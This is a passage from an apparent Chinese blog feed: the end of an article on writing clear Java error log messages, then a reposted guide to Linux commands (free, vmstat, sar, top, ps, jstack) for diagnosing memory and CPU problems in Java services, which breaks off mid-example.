半英文句式读起来不够清晰明白，需要思考来拼凑起完整的意思：</strong></p><p>log.warn(“cache status conflict, device id “+deviceDO.getId()+” db status “+deviceDO.getStatus() +”, nc status “+ status);</p><p>改为:</p><p>log.warn(String.format(“[query cache status] device cache status conflicts between regiondb and nc, status of device ‘%s’ in regiondb is %s , but is %s in nc.”, deviceDO.getId(), deviceDO.getStatus(), status));</p><p>解决方案：改为自然可读的英文句式。</p><p>总结起来， 错误日志格式可以为：</p><p>log.error(“[接口名或操作名] [Some Error Msg] happens. [params] [Probably Because]. [Probably need to do].”);</p><p>log.error(String.format(“[接口名或操作名] [Some Error Msg] happens. [%s]. [Probably Because]. [Probably need to do].”, params));</p><p>或</p><p>log.error(“[Some Error Msg] happens to 错误参数或内容 when [in some condition]. [Probably Because]. [Probably need to do].”);</p><p>log.error(String.format(“[Some Error Msg] happens to %s when [in some condition]. [Probably Because]. [Probably need to do].”, parameters));</p><p>[Probably Reason]. [Probably need to do]. 在某些情况下可以省略；在一些重要接口和场景下最好能说明一下。</p><p>每一条错误日志都是独立的，尽可能完整、具体、直接说明何种场景下发生了什么错误，由什么原因导致，要采用什么措施或步骤。</p><p>问题：</p><p>1.String.format 的性能会影响打日志吗？一般来说， 错误日志应该是比较少的， 使用 String.format 的频度并不会太高，不会对应用和日志造成影响。</p><p>2.开发时间非常紧张时， 有时间去斟酌字句吗？建立一个标准化的内容格式，将内容往格式套，可以节省斟酌字句的时间。</p><p>3.什么时候使用 info, warn , error ?</p><p>info 用于打印程序应该出现的正常状态信息， 便于追踪定位；</p><p>warn 表明系统出现轻微的不合理但不影响运行和使用；</p><p>error 表明出现了系统错误和异常，无法正常完成目标操作。</p><p><a href="http://stackoverflow.com/questions/2031163/when-to-use-log-level-warn-vs-error">http://stackoverflow.com/questions/2031163/when-to-use-log-level-warn-vs-error</a></p><p>错误日志是排查问题的重要手段之一。当我们编程实现一项功能时， 通常会考虑可能发生的各种错误及相应原因：</p><p>要排查出相应的原因， 就需要一些关键描述来定位原因。这就会形成三元组：</p><p>错误现象 -&gt; 错误关键描述 -&gt; 最终的错误原因。</p><p>需要针对每一种错误尽可能提供相应的错误关键描述，从而定位到相应的错误原因。</p><p>也就是说，编程的时候，要仔细思考， 哪些描述是非常有利于定位错误原因的， 尽可能将这些描述添加到错误日志中。</p><p>文中没有指出的问题或困难， 请提出你的建议。</p>]]></content>
      
      
      <categories>
          
          <category> 转载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 转载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java后端线上问题排查常用命令收藏</title>
      <link href="/posts/1696090382/"/>
      <url>/posts/1696090382/</url>
      
        <content type="html"><![CDATA[<blockquote><p>作者：xiaolyuh</p><p>本文来源：<a href="http://r6d.cn/b97q7">http://r6d.cn/b97q7</a></p></blockquote><h1 id="内存瓶颈"><a href="#内存瓶颈" class="headerlink" title="内存瓶颈"></a>内存瓶颈</h1><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><p><code>free</code>是查看内存使用情况，包括物理内存、交换内存(swap)和内核缓冲区内存。</p><p><code>free -h -s 3</code>表示每隔三秒输出一次内存情况，命令如下</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[1014154@cc69dd4c5-4tdb5 ~]$ free</span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:      119623656    43052220    45611364     4313760    30960072    70574408</span><br><span class="line">Swap:             0           0           0</span><br><span class="line">[1014154@cc69dd4c5-4tdb5 ~]$ free -h -s 3</span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:           114G         41G         43G        4.1G         29G         67G</span><br><span class="line">Swap:            0B          0B          0B</span><br><span class="line"></span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:           114G         41G         43G        4.1G         29G         67G</span><br><span class="line">Swap:            0B          0B          0B</span><br></pre></td></tr></tbody></table></figure><ul><li><code>Mem</code>：是内存的使用情况。</li><li><code>Swap</code>：是交换空间的使用情况。</li><li><code>total</code>：系统总的可用物理内存和交换空间大小。</li><li><code>used</code>：已经被使用的物理内存和交换空间。</li><li><code>free</code>：还有多少物理内存和交换空间可用使用，是真正尚未被使用的物理内存数量。</li><li><code>shared</code>：被共享使用的物理内存大小。</li><li><code>buff/cache</code>：被 buffer（缓冲区） 和 cache（缓存） 使用的物理内存大小。</li><li><code>available</code>：还可以被应用程序使用的物理内存大小，它是从应用程序的角度看到的可用内存数量，available ≈ free + buffer + cache。</li></ul><h3 id="交换空间-swap-space"><a href="#交换空间-swap-space" class="headerlink" title="交换空间(swap space)"></a>交换空间(swap space)</h3><p>swap space 是磁盘上的一块区域，当系统物理内存吃紧时，Linux 会将内存中不常访问的数据保存到 swap 上，这样系统就有更多的物理内存为各个进程服务，而当系统需要访问 swap 上存储的内容时，再将 swap 上的数据加载到内存中，这就是常说的换出和换入。交换空间可以在一定程度上缓解内存不足的情况，但是它需要读写磁盘数据，所以性能不是很高。</p><h2 id="vmstat（推荐）"><a href="#vmstat（推荐）" class="headerlink" title="vmstat（推荐）"></a>vmstat（推荐）</h2><p>vmstat（VirtualMeomoryStatistics，虚拟内存统计）是Linux中监控内存的常用工具，可对操作系统的虚拟内存、进程、CPU等的整体情况进行监视，推荐使用。</p><p><code>vmstat 5 3</code>表示每隔5秒统计一次，一共统计三次。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[1014154@cc69dd4c5-4tdb5 ~]$ vmstat 5 3</span><br><span class="line">procs -----------memory---------- ---swap-- -----io---- -system-- ------cpu-----</span><br><span class="line"> r  b   swpd   free   buff  cache   si   so    bi    bo   in   cs us sy id wa st</span><br><span class="line"> 8  0      0 45453212 374768 30763728    0    0    14    99    1    1 11 10 78  0  1</span><br><span class="line">10  0      0 45489232 374768 30763360    0    0     2  1275 95118 97908 13 11 75  0  1</span><br><span class="line"> 6  0      0 45452908 374768 30765148    0    0     0  3996 89924 92073 12 10 78  0  1</span><br></pre></td></tr></tbody></table></figure><h3 id="procs"><a href="#procs" class="headerlink" title="procs"></a>procs</h3><p><code>r</code>：表示运行和等待CPU时间片的进程数（就是说多少个进程真的分配到CPU），这个值如果长期大于系统CPU个数，说明CPU不足，需要增加CPU。<code>b</code>：表示在等待资源的进程数，比如正在等待I/O或者内存交换等。</p><h3 id="memory"><a href="#memory" class="headerlink" title="memory"></a>memory</h3><p><code>swpd</code>：表示切换到内存交换区的内存大小，即虚拟内存已使用的大小（单位KB），如果大于0，表示你的机器物理内存不足了，如果不是程序内存泄露的原因，那么你该升级内存了或者把耗内存的任务迁移到其他机器。<code>free</code>：表示当前空闲的物理内存。<code>buff</code>：表示缓冲大小，一般对块设备的读写才需要缓冲 <code>Cache</code>：表示缓存大小，一般作为文件系统进行缓冲，频繁访问的文件都会被缓存，如果cache值非常大说明缓存文件比较多，如果此时io中的bi比较小，说明文件系统效率比较好。</p><h3 id="swap"><a href="#swap" class="headerlink" title="swap"></a>swap</h3><p><code>si</code>：表示数据由磁盘读入内存；通俗的讲就是每秒从磁盘读入虚拟内存的大小，如果这个值大于0，表示物理内存不够用或者内存泄露了，要查找耗内存进程解决掉。<code>so</code>：表示由内存写入磁盘，也就是由内存交换区进入内存的数据大小。</p><blockquote><p><strong>!!</strong> 注意：一般情况下si、so的值都为0，如果si、so的值长期不为0，则说明系统内存不足，需要增加系统内存</p></blockquote><h3 id="io"><a href="#io" class="headerlink" title="io"></a>io</h3><p><code>bi</code>：表示由块设备读入数据的总量，即读磁盘，单位kb/s <code>bo</code>：表示写到块设备数据的总量，即写磁盘，单位kb/s</p><blockquote><p><strong>!!</strong> 注意：如果bi+bo的值过大，且wa值较大，则表示系统磁盘IO瓶颈。</p></blockquote><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><p><code>in</code>：表示某一时间间隔内观测到的每秒设备终端数。<code>cs</code>：表示每秒产生的上下文切换次数，这个值要越小越好，太大了，要考虑调低线程或者进程的数目。例如在apache和nginx这种web服务器中，我们一般做性能测试时会进行几千并发甚至几万并发的测试，选择web服务器的进程可以由进程或者线程的峰值一直下调，压测，直到cs到一个比较小的值，这个进程和线程数就是比较合适的值了。系统调用也是，每次调用系统函数，我们的代码就会进入内核空间，导致上下文切换，这个是很耗资源，也要尽量避免频繁调用系统函数。上下文切换次数过多表示你的CPU大部分浪费在上下文切换，导致CPU干正经事的时间少了，CPU没有充分利用，是不可取的。</p><blockquote><p><strong>!!</strong> 注意：这两个值越大，则由内核消耗的CPU就越多。</p></blockquote><h3 id="CPU"><a href="#CPU" class="headerlink" title="CPU"></a>CPU</h3><p><code>us</code>：表示用户进程消耗的CPU时间百分比，us值越高，说明用户进程消耗CPU时间越多，如果长期大于50%，则需要考虑优化程序或者算法。<code>sy</code>：表示系统内核进程消耗的CPU时间百分比，一般来说us+sy应该小于80%，如果大于80%，说明可能存在CPU瓶颈。<code>id</code>：表示CPU处在空间状态的时间百分比。<code>wa</code>：表示IP等待所占用的CPU时间百分比，wa值越高，说明I/O等待越严重，根据经验wa的参考值为20%，如果超过20%，说明I/O等待严重，引起I/O等待的原因可能是磁盘大量随机读写造成的，也可能是磁盘或者监控器的贷款瓶颈（主要是块操作）造成的。</p><h2 id="sar"><a href="#sar" class="headerlink" title="sar"></a>sar</h2><p>sar和free类似<code>sar -r 3</code>每隔三秒输出一次内存信息：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# sar -r 3</span><br><span class="line">Linux 3.10.0-1062.el7.x86_64 (localhost.localdomain)    2020年04月28日  _x86_64_        (2 CPU)</span><br><span class="line"></span><br><span class="line">15时40分10秒 kbmemfree kbmemused  %memused kbbuffers  kbcached  kbcommit   %commit  kbactive   kbinact   kbdirty</span><br><span class="line">15时40分13秒    106800   1314960     92.49      2144    573248   4110864    116.82    563664    498888        36</span><br><span class="line">15时40分16秒    106816   1314944     92.49      2144    573248   4110864    116.82    563668    498888        36</span><br><span class="line">15时40分19秒    106816   1314944     92.49      2144    573248   4110864    116.82    563668    498888        36</span><br></pre></td></tr></tbody></table></figure><h1 id="CPU瓶颈"><a href="#CPU瓶颈" class="headerlink" title="CPU瓶颈"></a>CPU瓶颈</h1><h2 id="查看机器cpu核数"><a href="#查看机器cpu核数" class="headerlink" title="查看机器cpu核数"></a>查看机器cpu核数</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CPU总核数 = 物理CPU个数 * 每颗物理CPU的核数 </span><br><span class="line">总逻辑CPU数 = 物理CPU个数 * 每颗物理CPU的核数 * 超线程数</span><br></pre></td></tr></tbody></table></figure><h3 id="查看CPU信息（型号）"><a href="#查看CPU信息（型号）" class="headerlink" title="查看CPU信息（型号）"></a>查看CPU信息（型号）</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[1014154@cc69dd4c5-4tdb5 ~]$ cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c</span><br><span class="line">     32  Intel(R) Xeon(R) CPU E5-2650 v4 @ 2.20GHz</span><br></pre></td></tr></tbody></table></figure><h3 id="查看物理CPU个数"><a href="#查看物理CPU个数" class="headerlink" title="查看物理CPU个数"></a>查看物理CPU个数</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[1014154@cc69dd4c5-4tdb5 ~]$ cat /proc/cpuinfo| grep "physical id"| sort| uniq| wc -l</span><br><span class="line">16</span><br></pre></td></tr></tbody></table></figure><h3 id="查看每个物理CPU中core的个数-即核数"><a href="#查看每个物理CPU中core的个数-即核数" class="headerlink" title="查看每个物理CPU中core的个数(即核数)"></a>查看每个物理CPU中core的个数(即核数)</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[1014154@cc69dd4c5-4tdb5 ~]$ cat /proc/cpuinfo| grep "cpu cores"| uniq</span><br><span class="line">cpu cores       : 2</span><br></pre></td></tr></tbody></table></figure><h3 id="查看逻辑CPU的个数"><a href="#查看逻辑CPU的个数" class="headerlink" title="查看逻辑CPU的个数"></a>查看逻辑CPU的个数</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[1014154@cc69dd4c5-4tdb5 ~]$ cat /proc/cpuinfo| grep "processor"| wc -l</span><br><span class="line">32</span><br></pre></td></tr></tbody></table></figure><h2 id="top"><a href="#top" class="headerlink" title="top"></a>top</h2><p>在Linux内核的操作系统中，进程是根据虚拟运行时间（由进程优先级、nice值加上实际占用的CPU时间进行动态计算得出）进行动态调度的。在执行进程时，需要从用户态转换到内核态，用户空间不能直接操作内核空间的函数。通常要利用系统调用来完成进程调度，而用户空间到内核空间的转换通常是通过软中断来完成的。例如要进行磁盘操作，用户态需要通过系统调用内核的磁盘操作指令，所以CPU消耗的时间被切分成用户态CPU消耗、系统（内核） CPU 消耗，以及磁盘操作 CPU 消耗。执行进程时，需要经过一系列的操作，进程首先在用户态执行，在执行过程中会进行进程优先级的调整（nice），通过系统调用到内核，再通过内核调用，硬中断、软中断，让硬件执行任务。执行完成之后，再从内核态返回给系统调用，最后系统调用将结果返回给用户态的进程。</p><p>top可以查看CPU总体消耗，包括分项消耗，如User，System，Idle，nice等。<code>Shift + H</code>显示java线程；<code>Shift + M</code>按照内存使用排序；<code>Shift + P</code>按照CPU使用时间（使用率）排序；<code>Shift + T</code>按照CPU累积使用时间排序；多核CPU，进入top视图<code>1</code>，可以看到各各CPU的负载情况。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">top - 15:24:11 up 8 days,  7:52,  1 user,  load average: 5.73, 6.85, 7.33</span><br><span class="line">Tasks:  17 total,   1 running,  16 sleeping,   0 stopped,   0 zombie</span><br><span class="line">%Cpu(s): 13.9 us,  9.2 sy,  0.0 ni, 76.1 id,  0.1 wa,  0.0 hi,  0.1 si,  0.7 st</span><br><span class="line">KiB Mem : 11962365+total, 50086832 free, 38312808 used, 31224016 buff/cache</span><br><span class="line">KiB Swap:        0 total,        0 free,        0 used. 75402760 avail Mem</span><br><span class="line"></span><br><span class="line">   PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND</span><br><span class="line">   300 ymmapp    20   0 17.242g 1.234g  14732 S   2.3  1.1   9:40.38 java</span><br><span class="line">     1 root      20   0   15376   1988   1392 S   0.0  0.0   0:00.06 sh</span><br><span class="line">    11 root      20   0  120660  11416   1132 S   0.0  0.0   0:04.94 python</span><br><span class="line">    54 root      20   0   85328   2240   1652 S   0.0  0.0   0:00.00 su</span><br><span class="line">    55 ymmapp    20   0   17432   1808   1232 S   0.0  0.0   0:00.00 bash</span><br><span class="line">    56 ymmapp    20   0   17556   2156   1460 S   0.0  0.0   0:00.03 control.sh</span><br><span class="line">    57 ymmapp    20   0   11880    740    576 S   0.0  0.0   0:00.00 tee</span><br><span class="line">   115 ymmapp    20   0   17556   2112   1464 S   0.0  0.0   0:00.02 control_new_war</span><br><span class="line">   133 root      20   0  106032   4240   3160 S   0.0  0.0   0:00.03 sshd</span><br><span class="line">   134 ymmapp    20   0   17080   6872   3180 S   0.0  0.0   0:01.82 ops-updater</span><br><span class="line">   147 ymmapp    20   0   17956   2636   1544 S   0.0  0.0   0:00.07 control.sh</span><br><span class="line">  6538 ymmapp    20   0  115656  10532   3408 S   0.0  0.0   0:00.46 beidou-agent</span><br><span class="line">  6785 ymmapp    20   0 2572996  22512   2788 S   0.0  0.0   0:03.44 gatherinfo4dock</span><br><span class="line"> 29241 root      20   0  142148   5712   4340 S   0.0  0.0   0:00.04 sshd</span><br><span class="line"> 29243 1014154   20   0  142148   2296    924 S   0.0  0.0   0:00.00 sshd</span><br><span class="line"> 29244 1014154   20   0   15208   2020   1640 S   0.0  0.0   0:00.00 bash</span><br><span class="line"> 32641 1014154   20   0   57364   2020   1480 R   0.0  0.0   0:00.00 top</span><br></pre></td></tr></tbody></table></figure><p>第一行：<code>15:24:11 up 8 days, 7:52, 1 user, load average: 5.73, 6.85, 7.33</code>：15:24:11 系统时间，up 8 days 运行时间，1 user 当前登录用户数，load average 负载均衡情况，分别表示1分钟，5分钟，15分钟负载情况。</p><p>第二行：<code>Tasks: 17 total, 1 running, 16 sleeping, 0 stopped, 0 zombie</code>：总进程数17，运行数1，休眠 16，停止0，僵尸进程0。</p><p>第三行：<code>%Cpu(s): 13.9 us, 9.2 sy, 0.0 ni, 76.1 id, 0.1 wa, 0.0 hi, 0.1 si, 0.7 st</code>：用户空间CPU占比13.9%，内核空间CPU占比9.2%，改变过优先级的进程CPU占比0%，空闲CPU占比76.1，IO等待占用CPU占比0.1%，硬中断占用CPU占比0%，软中断占用CPU占比0.1%,当前VM中的cpu 时钟被虚拟化偷走的比例0.7%。</p><p>第四和第五行表示内存和swap区域的使用情况。</p><p>第七行表示：</p><ul><li><code>PID</code>: 进程id</li><li><code>USER</code>:进程所有者</li><li><code>PR</code>:进程优先级</li><li><code>NI</code>:nice值。负值表示高优先级，正值表示低优先级</li><li><code>VIRT</code>:虚拟内存，进程使用的虚拟内存总量，单位kb。VIRT=SWAP+RES</li><li><code>RES</code>:常驻内存，进程使用的、未被换出的物理内存大小，单位kb。RES=CODE+DATA</li><li><code>SHR</code>:共享内存，共享内存大小，单位kb</li><li><code>S</code>:进程状态。D=不可中断的睡眠状态 R=运行 S=睡眠 T=跟踪/停止 Z=僵尸进程</li><li><code>%CPU</code>:上次更新到现在的CPU时间占用百分比</li><li><code>%MEM</code>:进程使用的物理内存百分比</li><li><code>TIME+</code>:进程使用的CPU时间总计，单位1/100秒</li><li><code>COMMAND</code>:进程名称（命令名/命令行）</li></ul><h3 id="计算在cpu-load里面的uninterruptedsleep的任务数量"><a href="#计算在cpu-load里面的uninterruptedsleep的任务数量" class="headerlink" title="计算在cpu load里面的uninterruptedsleep的任务数量"></a>计算在cpu load里面的uninterruptedsleep的任务数量</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">top -b -n 1 | awk '{if (NR&lt;=7)print;else if($8=="D"){print;count++}}END{print "Total status D:"count}'</span><br><span class="line">[root@localhost ~]# top -b -n 1 | awk '{if (NR&lt;=7)print;else if($8=="D"){print;count++}}END{print "Total status D:"count}'</span><br><span class="line">top - 15:35:05 up 1 day, 26 min,  3 users,  load average: 0.00, 0.01, 0.05</span><br><span class="line">Tasks: 225 total,   1 running, 224 sleeping,   0 stopped,   0 zombie</span><br><span class="line">%Cpu(s):  2.5 us, 10.0 sy,  0.0 ni, 87.5 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">KiB Mem :  1421760 total,   104516 free,   777344 used,   539900 buff/cache</span><br><span class="line">KiB Swap:  2097148 total,  2071152 free,    25996 used.   456028 avail Mem</span><br><span class="line"></span><br><span class="line">   PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND</span><br><span class="line">Total status D:</span><br></pre></td></tr></tbody></table></figure><h2 id="sar-1"><a href="#sar-1" class="headerlink" title="sar"></a>sar</h2><p>通过<code>sar -u 3</code>可以查看CUP总体消耗占比：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# sar -u 3</span><br><span class="line">Linux 3.10.0-1062.el7.x86_64 (localhost.localdomain)    2020年05月01日  _x86_64_        (2 CPU)</span><br><span class="line"></span><br><span class="line">15时18分03秒     CPU     %user     %nice   %system   %iowait    %steal     %idle</span><br><span class="line">15时18分06秒     all      0.00      0.00      0.17      0.00      0.00     99.83</span><br><span class="line">15时18分09秒     all      0.00      0.00      0.17      0.00      0.00     99.83</span><br><span class="line">15时18分12秒     all      0.17      0.00      0.17      0.00      0.00     99.66</span><br><span class="line">15时18分15秒     all      0.00      0.00      0.00      0.00      0.00    100.00</span><br><span class="line">15时18分18秒     all      0.00      0.00      0.00      0.00      0.00    100.00</span><br></pre></td></tr></tbody></table></figure><ul><li><code>%user</code>：用户空间的CPU使用。</li><li><code>%nice</code>：改变过优先级的进程的CPU使用率。</li><li><code>%system</code>：内核空间的CPU使用率。</li><li><code>%iowait</code>：CPU等待IO的百分比 。</li><li><code>%steal</code>：虚拟机的虚拟机CPU使用的CPU。</li><li><code>%idle</code>：空闲的CPU。</li></ul><p>在以上的显示当中，主要看<code>%iowait</code>和<code>%idle</code>：</p><ul><li>若 <code>%iowait</code>的值过高，表示硬盘存在I/O瓶颈；</li><li>若 <code>%idle</code>的值高但系统响应慢时，有可能是 CPU 等待分配内存，此时应加大内存容量；</li><li>若 <code>%idle</code>的值持续低于 10，则系统的 CPU 处理能力相对较低，表明系统中最需要解决的资源是 CPU；</li></ul><h2 id="定位线上最耗CPU的线程"><a href="#定位线上最耗CPU的线程" class="headerlink" title="定位线上最耗CPU的线程"></a>定位线上最耗CPU的线程</h2><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>启动一个程序。<code>arthas-demo</code>是一个简单的程序，每隔一秒生成一个随机数，再执行质因数分解，并打印出分解结果。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://alibaba.github.io/arthas/arthas-demo.jar</span><br><span class="line">java -jar arthas-demo.jar</span><br><span class="line">[root@localhost ~]# curl -O https://alibaba.github.io/arthas/arthas-demo.jar</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  3743  100  3743    0     0   3022      0  0:00:01  0:00:01 --:--:--  3023</span><br><span class="line">[root@localhost ~]# java -jar arthas-demo.jar</span><br><span class="line">1813=7*7*37</span><br><span class="line">illegalArgumentCount:  1, number is: -180005, need &gt;= 2</span><br><span class="line">illegalArgumentCount:  2, number is: -111175, need &gt;= 2</span><br><span class="line">18505=5*3701</span><br><span class="line">166691=7*23813</span><br><span class="line">105787=11*59*163</span><br><span class="line">60148=2*2*11*1367</span><br><span class="line">196983=3*3*43*509</span><br><span class="line">illegalArgumentCount:  3, number is: -173479, need &gt;= 2</span><br><span class="line">illegalArgumentCount:  4, number is: -112840, need &gt;= 2</span><br><span class="line">39502=2*19751</span><br><span class="line">....</span><br></pre></td></tr></tbody></table></figure><h3 id="通过top命令找到最耗时的进程"><a href="#通过top命令找到最耗时的进程" class="headerlink" title="通过top命令找到最耗时的进程"></a>通过<code>top</code>命令找到最耗时的进程</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# top</span><br><span class="line">top - 11:11:05 up 20:02,  3 users,  load average: 0.09, 0.07, 0.05</span><br><span class="line">Tasks: 225 total,   1 running, 224 sleeping,   0 stopped,   0 zombie</span><br><span class="line">%Cpu(s):  0.0 us,  0.7 sy,  0.0 ni, 99.3 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st</span><br><span class="line">KiB Mem :  1421760 total,   135868 free,   758508 used,   527384 buff/cache</span><br><span class="line">KiB Swap:  2097148 total,  2070640 free,    26508 used.   475852 avail Mem</span><br><span class="line">Change delay from 3.0 to</span><br><span class="line">   PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND</span><br><span class="line"> 98344 root      20   0 2422552  23508  12108 S   0.7  1.7   0:00.32 java</span><br><span class="line">     1 root      20   0  194100   6244   3184 S   0.0  0.4   0:20.41 systemd</span><br><span class="line">     2 root      20   0       0      0      0 S   0.0  0.0   0:00.12 kthreadd</span><br><span class="line">     4 root       0 -20       0      0      0 S   0.0  0.0   0:00.00 kworker/0:0H</span><br><span class="line">     6 root      20   0       0      0      0 S   0.0  0.0   0:20.25 ksoftirqd/0</span><br></pre></td></tr></tbody></table></figure><p>找到进程号是98344。</p><h3 id="找到进程中最耗CUP的线程"><a href="#找到进程中最耗CUP的线程" class="headerlink" title="找到进程中最耗CUP的线程"></a>找到进程中最耗CUP的线程</h3><p>使用<code>ps -Lp #pid cu</code>命令，查看某个进程中的线程CPU消耗排序：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# ps -Lp 98344 cu</span><br><span class="line">USER        PID    LWP %CPU NLWP %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">root      98344  98344  0.0   10  4.1 2422552 59060 pts/0   Sl+  11:09   0:00 java</span><br><span class="line">root      98344  98345  0.0   10  4.1 2422552 59060 pts/0   Sl+  11:09   0:04 java</span><br><span class="line">root      98344  98346  0.0   10  4.1 2422552 59060 pts/0   Sl+  11:09   0:01 VM Thread</span><br><span class="line">root      98344  98347  0.0   10  4.1 2422552 59060 pts/0   Sl+  11:09   0:00 Reference Handl</span><br><span class="line">root      98344  98348  0.0   10  4.1 2422552 59060 pts/0   Sl+  11:09   0:00 Finalizer</span><br><span class="line">root      98344  98349  0.0   10  4.1 2422552 59060 pts/0   Sl+  11:09   0:00 Signal Dispatch</span><br><span class="line">root      98344  98350  0.0   10  4.1 2422552 59060 pts/0   Sl+  11:09   0:05 C2 CompilerThre</span><br><span class="line">root      98344  98351  0.0   10  4.1 2422552 59060 pts/0   Sl+  11:09   0:00 C1 CompilerThre</span><br><span class="line">root      98344  98352  0.0   10  4.1 2422552 59060 pts/0   Sl+  11:09   0:00 Service Thread</span><br><span class="line">root      98344  98353  0.1   10  4.1 2422552 59060 pts/0   Sl+  11:09   0:19 VM Periodic Tas</span><br></pre></td></tr></tbody></table></figure><p>看<code>TIME</code>列可以看出那个线程耗费CUP多，根据<code>LWP</code>列可以看到线程的ID号，但是需要转换成16进制才可以查询线程堆栈信息。</p><h3 id="获取线程id的十六进制码"><a href="#获取线程id的十六进制码" class="headerlink" title="获取线程id的十六进制码"></a>获取线程id的十六进制码</h3><p>使用<code>printf '%x\n' 98345</code>命令做进制转换：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# printf '%x\n' 98345</span><br><span class="line">18029</span><br></pre></td></tr></tbody></table></figure><h3 id="查看线程堆栈信息"><a href="#查看线程堆栈信息" class="headerlink" title="查看线程堆栈信息"></a>查看线程堆栈信息</h3><p>使用jstack获取堆栈信息<code>jstack 98344 | grep -A 10 18029</code>：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# 